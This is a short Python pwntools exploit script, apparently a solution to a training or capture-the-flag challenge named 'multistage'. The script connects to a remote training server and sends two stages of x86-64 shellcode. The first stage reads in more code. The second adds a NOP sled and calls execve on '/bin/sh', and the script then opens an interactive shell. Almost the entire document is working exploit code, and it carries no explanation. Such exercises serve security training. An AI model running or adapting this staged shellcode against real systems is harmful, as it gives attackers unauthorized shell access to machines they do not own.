Sfrom pwn import *

# context.terminal = ['tmux', 'splitw', '-h']
# r = process("./multistage")
# gdb.attach(r,'''
# b * 0x0040123f
# ''')
#input("wait")
r = remote("bin.training.offdef.it", 2003)

asm_code = """
mov rsi, rax
xor rax, rax
xor rdi, rdi
mov rdx, 0x40
syscall
"""

nopsled = """
nop 
""" * 18

#lenght 0x1e
asm_code2 = """
mov rax, 0x3b
mov rdi, rsi
mov rsi, 0 
mov rdx, 0
add rdi, 0x30
syscall
"""

context.arch = 'amd64'
stringa = "/bin/sh"


shellcode = asm(asm_code)
shellcode2 = asm(nopsled + asm_code2)

r.send(shellcode)
input("wait")
r.send(shellcode2+(b"/bin/sh"))

r.interactive()
